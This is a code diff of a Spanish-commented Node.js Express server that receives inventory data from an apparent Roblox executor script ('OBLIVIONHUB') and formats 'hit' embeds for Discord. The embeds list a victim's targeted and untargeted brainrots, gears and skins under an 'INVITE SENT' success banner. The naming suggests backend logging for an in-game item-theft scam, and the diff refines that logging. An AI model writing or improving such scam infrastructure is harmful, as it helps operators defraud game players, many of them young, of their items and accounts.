@@ -5,7 +5,6 @@ const axios = require('axios');
 const app = express();
 app.use(express.json());
 
-// Middleware de seguridad
 app.use((req, res, next) => {
   const authHeader = req.headers.authorization;
   if (process.env.API_KEY && authHeader !== `Bearer ${process.env.API_KEY}`) {
@@ -22,55 +21,57 @@ app.post('/transform', async (req, res) => {
     res.json({ status: 'ok', message: 'Mensaje enviado a Discord' });
   } catch (error) {
     console.error(error);
-    res.status(500).json({ error: 'Error al procesar la solicitud' });
+    res.status(500).json({ error: 'Error al procesar' });
   }
 });
 
 function buildHitEmbed(data) {
-  const scriptName = process.env.SCRIPT_NAME || 'OBLIVIONHUB';
+  const scriptName = process.env.SCRIPT_NAME || 'Script';
   const executor = data.executor || 'Desconocido';
   const target = data.target || {};
-  const targetedBrainrots = data.targetedBrainrots || [];
-  const untargetedBrainrots = data.untargetedBrainrots || [];
-  const baseSkins = data.baseSkins || [];
-  const gears = data.gears || [];
   const timestamp = data.timestamp || '';
 
-  const targetedList = targetedBrainrots.map(item => `• ${item.displayName} — $${item.price}/s`).join('\n') || 'Ninguno';
-  const untargetedList = untargetedBrainrots.map(item => `• 🧠 ${item.displayName} — $${item.price}/s`).join('\n') || 'Ninguno';
+  // Targeted
+  const targetedBrainrots = data.targetedBrainrots || [];
+  const baseSkins = data.baseSkins || [];
+  const gears = data.gears || [];
 
-  // Base skins y gears juntos como "Targeted Gears & Base Skins"
-  const gearsAndSkins = [];
-  baseSkins.forEach(skin => gearsAndSkins.push(`• 👕 ${skin}`));
-  gears.forEach(gear => gearsAndSkins.push(`• ⚙️ ${gear}`));
-  const gearsSkinsList = gearsAndSkins.join('\n') || 'Ninguno';
+  const targetedBrainrotList = targetedBrainrots.map(item => `• ${item.displayName} — $${item.price}/s`).join('\n') || 'Ninguno';
+  const targetedSkinsList = baseSkins.map(skin => `• 👕 ${skin}`).join('\n') || '';
+  const targetedGearsList = gears.map(gear => `• ⚙️ ${gear}`).join('\n') || '';
+  const targetedGearsSkins = [targetedSkinsList, targetedGearsList].filter(Boolean).join('\n') || 'Ninguno';
+
+  // Untargeted (ahora incluye brainrots, skins y gears)
+  const untargetedBrainrots = data.untargetedBrainrots || [];
+  const untargetedSkins = data.untargetedBaseSkins || [];
+  const untargetedGears = data.untargetedGears || [];
+
+  const untargetedBrainrotList = untargetedBrainrots.map(item => `• 🧠 ${item.displayName} — $${item.price}/s`).join('\n') || '';
+  const untargetedSkinList = untargetedSkins.map(skin => `• 👕 ${skin}`).join('\n') || '';
+  const untargetedGearList = untargetedGears.map(gear => `• ⚙️ ${gear}`).join('\n') || '';
+  const untargetedAll = [untargetedBrainrotList, untargetedSkinList, untargetedGearList].filter(Boolean).join('\n') || 'Ninguno';
 
   const totalTargeted = targetedBrainrots.length + baseSkins.length + gears.length;
-  const totalUntargeted = untargetedBrainrots.length;
-
-  const description = [
-    `✨ Invite successfully sent to Username: **${executor}**`,
-    `Inventory scan complete. Processing items...`
-  ].join('\n');
+  const totalUntargeted = untargetedBrainrots.length + untargetedSkins.length + untargetedGears.length;
 
   return {
     title: `✅ SUCCESS: ${scriptName} INVITE SENT`,
-    description: description,
-    color: 0x2ecc71, // verde éxito
+    description: `✨ Invite successfully sent to Username: **${executor}**\nInventory scan complete. Processing items...`,
+    color: 0x2ecc71,
     fields: [
       {
         name: `🧠 Targeted Brainrots (${targetedBrainrots.length}):`,
-        value: targetedList || 'Ninguno',
+        value: targetedBrainrotList,
         inline: false
       },
       {
         name: `⚙️ Targeted Gears & Base Skins (${baseSkins.length + gears.length}):`,
-        value: gearsSkinsList || 'Ninguno',
+        value: targetedGearsSkins,
         inline: false
       },
       {
         name: `❌ Untargeted Items (${totalUntargeted}):`,
-        value: untargetedList || 'Ninguno',
+        value: untargetedAll,
         inline: false
       }
     ],
